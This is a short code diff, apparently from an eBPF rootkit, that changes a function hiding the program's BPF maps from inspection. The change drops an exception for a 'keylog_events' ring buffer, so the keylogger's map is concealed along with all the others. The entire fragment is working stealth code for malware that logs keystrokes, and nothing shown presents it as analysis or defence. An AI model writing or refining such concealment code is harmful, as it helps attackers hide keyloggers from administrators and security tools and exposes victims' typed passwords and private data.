@@ -68,17 +68,12 @@ static int hide_bpf_maps()
         return -EINVAL;
 
     struct bpf_map *map = NULL;
-    int ring_buffer_event_fd = bpf_map__fd(g_hider.skel->maps.keylog_events);
     int ret = 0;
 
     bpf_object__for_each_map(map, g_hider.skel->obj) {
         struct bpf_map_info info = {};
         uint32_t len = sizeof(info);
         int fd = bpf_map__fd(map);
-
-        /* Skip keylogger ring buffer that must stay exposed */
-        if (fd == ring_buffer_event_fd)
-            continue;
 
         if (fd >= 0 && bpf_obj_get_info_by_fd(fd, &info, &len) == 0) {
             int err = update_uint32_map(g_hider.hide_bpf_map_fd, info.id);
